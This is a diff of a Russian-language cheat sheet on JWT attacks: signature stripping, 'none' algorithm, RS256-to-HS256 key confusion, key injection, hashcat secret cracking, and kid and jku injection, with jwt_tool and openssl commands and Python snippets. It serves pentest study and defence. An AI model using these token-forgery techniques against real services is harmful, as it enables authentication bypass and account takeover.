@@ -31,25 +31,29 @@ JWT Claims
 
 JSON Web Token : ```Base64(Заголовок).Base64(Данные).Base64(Подпись)```
 
-```Пример : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY```
+* Пример: ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY```
 
-Где мы можем разделить его на 3 компонента, разделенные точкой.
+* 3 компонента, разделенные точкой.
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 # заголовок
 eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ # полезная нагрузка
 UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # подпись
 ```
+* **Header** — заголовок. Эта часть содержит информацию об алгоритме подписи токена и типе токена — всегда JWT. Заголовок обычно выглядит как JSON.
+* **Payload** — полезная нагрузка. Эта часть содержит утверждения (claims) — идентификатор пользователя, срок действия токена и другие пользовательские данные. Полезная нагрузка тоже представлена в формате JSON.
+* **Signature** — подпись. Эта часть содержит подпись токена, созданную на основе заголовка и полезной нагрузки, — с использованием секретного ключа, если используется соответствующий алгоритм. Подпись позволяет проверить, был ли токен подделан. Фактически она обеспечивает аутентификацию и целостность токена.
 
 ## Заголовок (Header)
 
-Зарегистрированные имена параметров заголовка, определенные в RFC JSON Web Signature (JWS). Самый простой заголовок JWT представляет собой следующий JSON.
+Зарегистрированные имена параметров заголовка, определенные в [RFC JSON Web Signature (JWS)](https://www.rfc-editor.org/rfc/rfc7515). Самый простой заголовок JWT представляет собой следующий JSON.
 ```python
 {
 "typ": "JWT",
 "alg": "HS256"
 }
 ```
-Другие параметры зарегистрированы в RFC.
+* Другие параметры зарегистрированы в RFC.
+
 | Параметр | Определение | Описание |
 | :--- | :--- | :--- |
 | **alg** | Algorithm (Алгоритм) | Идентифицирует криптографический алгоритм, используемый для защиты JWS |
@@ -64,7 +68,8 @@ UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # подпись
 | **cty** | Content Type (Тип содержимого) | Этот параметр заголовка не рекомендуется использовать |
 | **crit** | Critical (Критический) | Указывает, что используются расширения и/или JWA, которые должны быть обработаны и проверены |
 
-Алгоритм по умолчанию - "HS256" (симметричное шифрование HMAC SHA256). "RS256" используется для асимметричных целей (асимметричное шифрование RSA и подпись закрытым ключом).
+> Алгоритм по умолчанию - "HS256" (симметричное шифрование HMAC SHA256). "RS256" используется для асимметричных целей (асимметричное шифрование RSA и подпись закрытым ключом).
+
 | Значение параметра `alg` | Алгоритм цифровой подписи или MAC | Требования |
 | :--- | :--- | :--- |
 | **HS256** | HMAC с использованием SHA-256 | Обязателен |
@@ -82,18 +87,19 @@ UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # подпись
 | **none** | Цифровая подпись или MAC не выполняются | Обязателен |
 
 Внедрение заголовков с помощью [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): ```python3 jwt_tool.py JWT_ТУТ -I -hc header1 -hv testval1 -hc header2 -hv testval2```
-Полезная нагрузка (Payload)
 
+## Полезная нагрузка (Payload)
+```python
 {
 "sub":"1234567890",
 "name":"Amazing Haxx0r",
 "exp":"1466270722",
 "admin":true
 }
+```
+* **Утверждения (Claims)** — это предопределенные ключи и их значения:
 
-Утверждения (Claims) — это предопределенные ключи и их значения:
-text
-
+```
 iss: издатель токена (issuer)
 exp: метка времени истечения срока действия (отклонять токены с истекшим сроком). Примечание: как определено в спецификации, должно быть в секундах.
 iat: время выдачи JWT. Может использоваться для определения возраста JWT.
@@ -101,124 +107,156 @@ nbf: "не ранее" (not before) — будущее время, когда т
 jti: уникальный идентификатор для JWT. Используется для предотвращения повторного использования или воспроизведения JWT.
 sub: субъект токена (используется редко)
 aud: аудитория токена (также редко используется)
+```
+Внедрение утверждений в полезную нагрузку с помощью [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): python3 jwt_tool.py JWT_ТУТ -I -pc payload1 -pv testval3
 
-Внедрение утверждений в полезную нагрузку с помощью ticarpi/jwt_tool: python3 jwt_tool.py JWT_ТУТ -I -pc payload1 -pv testval3
-Подпись JWT (JWT Signature)
-Подпись JWT - Атака нулевой подписью (CVE-2020-28042)
+# Подпись JWT (JWT Signature)
 
-Отправьте JWT с алгоритмом HS256 без подписи, например: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
+> PEM — это текстовый формат для представления сертификатов и ключей, используя Base64-кодировку.
+> JWK — это формат представления криптографического ключа в виде JSON-объекта согласно стандарту RFC 7517.
 
-Эксплуатация:
+```python
+{
+  "keys": [
+    {
+      "kty": "RSA",                    // тип ключа (RSA, EC, oct)
+      "kid": "my-key-2024",            // идентификатор ключа
+      "use": "sig",                    // назначение (sig - подпись, enc - шифрование)
+      "alg": "RS256",                  // алгоритм
+      "n": "wFAz...AqE",              // модуль RSA (public key)
+      "e": "AQAB"                      // публичная экспонента RSA
+    }
+  ]
+}
+```
+## Подпись JWT - Атака нулевой подписью (CVE-2020-28042)
 
-python3 jwt_tool.py JWT_ТУТ -X n
+* Отправь JWT с алгоритмом HS256 без подписи, например: ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.```
 
-Деконструкция:
+* **Эксплуатация:**
 
+```python3 jwt_tool.py JWT_ТУТ -X n```
+
+* **Деконструкция:**
+
+```python
 {"alg":"HS256","typ":"JWT"}.
 {"sub":"1234567890","name":"John Doe","iat":1516239022}
+```
 
-Подпись JWT - Раскрытие корректной подписи (CVE-2019-7644)
+## Подпись JWT - Раскрытие корректной подписи (CVE-2019-7644)
 
-Отправьте JWT с некорректной подписью, конечная точка может ответить ошибкой, раскрывающей корректную.
-text
+* Отправь JWT с некорректной подписью, конечная точка может ответить ошибкой, раскрывающей корректную.
 
-jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61
-CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT
+[jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
+[CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)
 
+```
 Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
 Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
+```
 
-Подпись JWT - Алгоритм "none" (CVE-2015-9235)
+## Подпись JWT - Алгоритм "none" (CVE-2015-9235)
 
-JWT поддерживает алгоритм None для подписи. Вероятно, это было введено для отладки приложений. Однако это может серьезно повлиять на безопасность приложения.
+> JWT поддерживает алгоритм None для подписи. Вероятно, это было введено для отладки приложений. 
 
-Варианты алгоритма none:
-text
-
+* Варианты алгоритма none:
+```
 none
 None
 NONE
 nOnE
+```
 
-Чтобы воспользоваться этой уязвимостью, вам нужно просто декодировать JWT и изменить алгоритм, используемый для подписи. Затем вы можете отправить свой новый JWT. Однако это не сработает, если вы не удалите подпись.
+> Чтобы воспользоваться этой уязвимостью, нужно просто декодировать JWT и изменить алгоритм, используемый для подписи. Затем можно отправить свой новый JWT. Однако это не сработает, если не удалить подпись.
 
-Альтернативно вы можете изменить существующий JWT (будьте осторожны со временем истечения срока действия).
-text
+> Альтернативно, можно изменить существующий JWT (будь осторожны со временем истечения срока действия).
 
-Использование ticarpi/jwt_tool
+* Использование [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
 
-python3 jwt_tool.py [JWT_ТУТ] -X a
+```python
+python3 jwt_tool.py [JWT_ТУТ] -X a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJz....
+```
 
-Ручное редактирование JWT
+* Ручное редактирование JWT
 
+```python
 import jwt
 
 jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
 decodedToken = jwt.decode(jwtToken, verify=False)
-декодируем токен перед кодированием с типом 'None'
 
+# декодируем токен перед кодированием с типом 'None'
 noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)
 
 print(noneEncoded.decode())
+```
 
-Подпись JWT - Атака смешения ключей RS256 на HS256 (CVE-2016-5431)
+## Подпись JWT - Атака смешения ключей RS256 на HS256 (CVE-2016-5431)
 
-Если код сервера ожидает токен с "alg", установленным в RSA, но получает токен с "alg", установленным в HMAC, он может по ошибке использовать открытый ключ в качестве симметричного ключа HMAC при проверке подписи.
+> Если код сервера ожидает токен с "alg", установленным в RSA, но получает токен с "alg", установленным в HMAC, он может по ошибке использовать открытый ключ в качестве симметричного ключа HMAC при проверке подписи.
 
-Поскольку злоумышленник иногда может получить открытый ключ, он может изменить алгоритм в заголовке на HS256, а затем использовать открытый ключ RSA для подписи данных. Когда приложения используют одну и ту же пару ключей RSA для своего TLS-веб-сервера: openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout
-text
+Поскольку пользователь иногда может получить открытый ключ, он может изменить алгоритм в заголовке на HS256, а затем использовать открытый ключ RSA для подписи данных. Когда приложения используют одну и ту же пару ключей RSA для своего TLS-веб-сервера: ```openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout```
 
-Алгоритм HS256 использует секретный ключ для подписи и проверки каждого сообщения. Алгоритм RS256 использует закрытый ключ для подписи сообщения и открытый ключ для аутентификации.
+> Алгоритм HS256 использует секретный ключ для подписи и проверки каждого сообщения. Алгоритм RS256 использует закрытый ключ для подписи сообщения и открытый ключ для аутентификации.
 
+```python
 import jwt
 public = open('public.pem', 'r').read()
 print public
 print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
+```
+⚠️ Это поведение исправлено в библиотеке Python и будет возвращать ошибку ```jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret..``` Вам нужно установить следующую версию:``` pip install pyjwt==0.4.3```.
 
-⚠️ Это поведение исправлено в библиотеке Python и будет возвращать эту ошибку jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.. Вам нужно установить следующую версию: pip install pyjwt==0.4.3.
-text
+* Использование [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
 
-Использование ticarpi/jwt_tool
+```python3 jwt_tool.py JWT_ТУТ -X k -pk my_public.pem```
 
-python3 jwt_tool.py JWT_ТУТ -X k -pk my_public.pem
+* Использование [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
 
-Использование portswigger/JWT Editor
-text
+1. Найди открытый ключ, обычно в:
+```
+/jwks.json
+/.well-known/jwks.json
+/auth/jwks
+/api/jwks
+/keys
+/security/jwks
+/public-keys
+```
+2. Загрузи New RSA Key в JWT Editor Keys.
+3. В диалоговом окне вставь полученный JWK: ```{"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}```
+4. Выбери переключатель PEM и скопируйте полученный ключ PEM.
+5. Закодируй PEM в Base64.
+6. На вкладке JWT Editor Keys сгенерируй New Symmetric Key в формате JWK.
+7. Замени сгенерированное значение параметра k на ключ PEM в кодировке Base64, который только что скопировал.
+8. Измени алгоритм alg токена JWT на HS256 и данные.
+9. Нажми Sign и выберите опцию: Don't modify header
 
-Найдите открытый ключ, обычно в /jwks.json или /.well-known/jwks.json
-Загрузите его на вкладке JWT Editor Keys, нажмите New RSA Key.
-. В диалоговом окне вставьте полученный ранее JWK: {"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}
-Выберите переключатель PEM и скопируйте полученный ключ PEM.
-Перейдите на вкладку Decoder и закодируйте PEM в Base64.
-Вернитесь на вкладку JWT Editor Keys и сгенерируйте New Symmetric Key в формате JWK.
-Замените сгенерированное значение параметра k на ключ PEM в кодировке Base64, который вы только что скопировали.
-Измените алгоритм alg токена JWT на HS256 и данные.
-Нажмите Sign и выберите опцию: Don't modify header
+* Ручное редактирование токена RS256 в HS256 с использованием следующих шагов
 
-Ручное редактирование токена RS256 в HS256 с использованием следующих шагов
-text
-
-Преобразуем наш открытый ключ (key.pem) в HEX с помощью этой команды.
-
+1. Преобразуй открытый ключ (key.pem) в HEX с помощью:
+```python
 $ cat key.pem | xxd -p | tr -d "\\n"
 2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
-
-Сгенерируйте подпись HMAC, предоставив наш открытый ключ в виде шестнадцатеричного ASCII и наш ранее отредактированный токен.
-
+```
+2. Сгенерируй подпись HMAC, предоставив открытый ключ в виде шестнадцатеричного ASCII и ранее отредактированный токен.
+```python
 $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
 
 (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
-
-Преобразуйте подпись (Hex в "base64 URL").
-
+```
+3. Преобразуйте подпись (Hex в "base64 URL").
+```python
 python2 -c "exec("import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')")"
-
-Добавьте подпись к отредактированной полезной нагрузке.
-
+```
+4. Добавьте подпись к отредактированной полезной нагрузке.
+```python
 [ЗАГОЛОВОК ИЗМЕНЕН С RS256 НА HS256].[ДАННЫЕ ИЗМЕНЕНЫ].[ПОДПИСЬ]
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
+```
 
-Подпись JWT - Атака внедрения ключа (CVE-2018-0114)
+## Подпись JWT - Атака внедрения ключа (CVE-2018-0114)
 text
 
 Уязвимость в открытой библиотеке Cisco node-jose до версии 0.11.0 может позволить неаутентифицированному удаленному злоумышленнику повторно подписывать токены, используя ключ, встроенный в токен. Уязвимость возникает из-за того, что node-jose следует стандарту JSON Web Signature (JWS) для JSON Web Tokens (JWT). Этот стандарт указывает, что JSON Web Key (JWK), представляющий открытый ключ, может быть встроен в заголовок JWS. Затем этому открытому ключу доверяют для проверки. Злоумышленник может воспользоваться этим, подделывая действительные объекты JWS, удаляя исходную подпись, добавляя новый открытый ключ в заголовок, а затем подписывая объект с использованием (принадлежащего злоумышленнику) закрытого ключа, связанного с открытым ключом, встроенным в этот заголовок JWS.
@@ -226,7 +264,7 @@ text
 Эксплуатация:
 text
 
-Использование ticarpi/jwt_tool
+Использование [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
 
 python3 jwt_tool.py [JWT_ТУТ] -X i
 
@@ -251,7 +289,7 @@ python3 jwt_tool.py [JWT_ТУТ] -X i
 {"login":"admin"}.
 [Подписано новым закрытым ключом; открытый ключ внедрен]
 
-Подпись JWT - Восстановление открытого ключа из подписанных JWT
+## Подпись JWT - Восстановление открытого ключа из подписанных JWT
 
 Алгоритмы RS256, RS384 и RS512 используют RSA с заполнением PKCS#1 v1.5 в качестве схемы подписи. Это свойство позволяет вычислить открытый ключ по двум разным сообщениям и соответствующим подписям.
 
@@ -262,7 +300,7 @@ $ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sam
 Computing public key. This may take a minute...
 {"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
 
-Секрет JWT (JWT Secret)
+# JWT Secret
 text
 
 Для создания JWT используется секретный ключ для подписи заголовка и полезной нагрузки, что генерирует подпись. Секретный ключ должен храниться в тайне и быть защищенным, чтобы предотвратить несанкционированный доступ к JWT или подделку его содержимого. Если злоумышленник сможет получить доступ к секретному ключу, он сможет создавать, изменять или подписывать свои собственные токены, обходя предусмотренные средства защиты.
@@ -355,10 +393,11 @@ text
 Атака на основе правил: hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
 Атака полным перебором: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
 
-Утверждения JWT (JWT Claims)
+# JWT Claims
 
 Утверждения JSON Web Token от IANA
-Неправильное использование утверждения kid в JWT
+
+## Неправильное использование утверждения kid в JWT
 
 Утверждение "kid" (идентификатор ключа) в JSON Web Token (JWT) — это необязательный параметр заголовка, который используется для указания идентификатора криптографического ключа, использованного для подписи или шифрования JWT. Важно отметить, что сам идентификатор ключа не обеспечивает никаких преимуществ безопасности, а скорее позволяет получателю найти ключ, необходимый для проверки целостности JWT.
 text
@@ -410,7 +449,7 @@ text
 
 Изменение заголовка kid для попыток SQL-инъекций и инъекций команд.
 
-JWKS - внедрение через заголовок jku
+## JWKS - внедрение через заголовок jku
 
 Значение заголовка "jku" указывает на URL файла JWKS. Заменив URL "jku" на контролируемый злоумышленником URL, содержащий открытый ключ, злоумышленник может использовать соответствующий закрытый ключ для подписи токена и позволить службе получить вредоносный открытый ключ и проверить токен.
 
